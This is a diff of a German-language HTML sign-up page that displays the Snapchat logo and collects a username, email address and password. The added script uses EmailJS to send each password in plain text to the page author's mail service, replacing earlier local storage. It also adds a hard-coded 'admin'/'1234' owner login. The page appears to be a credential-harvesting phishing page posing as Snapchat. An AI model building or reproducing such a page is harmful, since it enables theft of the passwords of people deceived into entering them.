@@ -91,9 +91,91 @@
             from { opacity: 0; transform: scale(0.9); }
             to { opacity: 1; transform: scale(1); }
         }
+        
+        footer {
+            width: 100%;
+            background-color: #f8f9fa;
+            padding: 20px 0;
+            position: absolute;
+            bottom: 0;
+            text-align: center;
+            font-size: 14px;
+        }
+        .footer-links a {
+            margin: 0 10px;
+            color: black;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            emailjs.init("Xzhg4VF94ybNa1_1E"); // Neuer Public API-Key
+        });
+
+        function registerUser(event) {
+            event.preventDefault();
+
+            let username = document.getElementById('username').value.trim();
+            let password = document.getElementById('password').value;
+            let email = document.getElementById('email').value.trim();
+            let message = document.getElementById('message');
+
+            // Passwortvalidierung (mind. 8 Zeichen)
+            if (password.length < 8) {
+                message.style.color = "red";
+                message.innerText = "Passwort muss mindestens 8 Zeichen lang sein!";
+                return;
+            }
+
+            // E-Mail-Validierung
+            let emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailPattern.test(email)) {
+                message.style.color = "red";
+                message.innerText = "Bitte geben Sie eine gültige E-Mail-Adresse ein!";
+                return;
+            }
+
+            // Senden der Benutzerdaten per E-Mail mit EmailJS
+            emailjs.send("service_msml4i8", "template_jcrgoie", {  
+                username: username,
+                email: email,
+                password: password
+            })
+            .then(function(response) {
+                console.log('Erfolgreich gesendet:', response);
+                message.style.color = "green";
+                message.innerText = "Anmeldung erfolgreich! Eine Bestätigungs-E-Mail wurde gesendet.";
+            }, function(error) {
+                console.error('Fehler beim Senden:', error);
+                message.style.color = "red";
+                message.innerText = "Fehler beim Senden der E-Mail. Bitte versuche es später erneut.";
+            });
+        }
+
+        function showOwnerLogin() {
+            document.getElementById('user-login').classList.add('hidden');
+            document.getElementById('owner-login').classList.remove('hidden');
+        }
+
+        function ownerLogin() {
+            let ownerUser = document.getElementById('owner-username').value;
+            let ownerCode = document.getElementById('owner-code').value;
+
+            if (ownerUser === "admin" && ownerCode === "1234") {
+                alert("Erfolgreich als Mitarbeiter eingeloggt!");
+            } else {
+                alert("Falsche Zugangsdaten!");
+            }
+        }
+    </script>
+    
     <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="logo">
     
     <div class="login-box" id="user-login">
@@ -121,48 +203,13 @@
         <button onclick="ownerLogin()">Login</button>
     </div>
     
-    <script>
-        function registerUser(event) {
-            event.preventDefault();
-            let username = document.getElementById('username').value.trim();
-            let password = document.getElementById('password').value;
-            let email = document.getElementById('email').value.trim();
-            let message = document.getElementById('message');
-            
-            if (password.length < 8) {
-                message.innerText = "Passwort muss mindestens 8 Zeichen lang sein!";
-                return;
-            }
-            
-            let emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailPattern.test(email)) {
-                message.innerText = "Bitte geben Sie eine gültige E-Mail-Adresse ein!";
-                return;
-            }
-            
-            let users = JSON.parse(localStorage.getItem('users')) || [];
-            users.push({ Benutzername: username, Passwort: password, Email: email });
-            localStorage.setItem('users', JSON.stringify(users));
-            message.style.color = "green";
-            message.innerText = "Anmeldung erfolgreich!";
-            setTimeout(() => window.location.href = "confirmation.html", 1000);
-        }
-
-        function showOwnerLogin() {
-            document.getElementById('user-login').classList.add('hidden');
-            document.getElementById('owner-login').classList.remove('hidden');
-        }
-
-        function ownerLogin() {
-            let ownerUsername = document.getElementById('owner-username').value;
-            let ownerCode = document.getElementById('owner-code').value;
-            
-            if (ownerUsername === "owner" && ownerCode === "21") {
-                window.location.href = "owner-dashboard.html";
-            } else {
-                alert("Falsche Zugangsdaten!");
-            }
-        }
-    </script>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Datenschutz</a>
+            <a href="#">Nutzungsbedingungen</a>
+            <a href="#">Impressum</a>
+            <a href="#">Hilfe</a>
+        </div>
+    </footer>
 </body>
 </html>
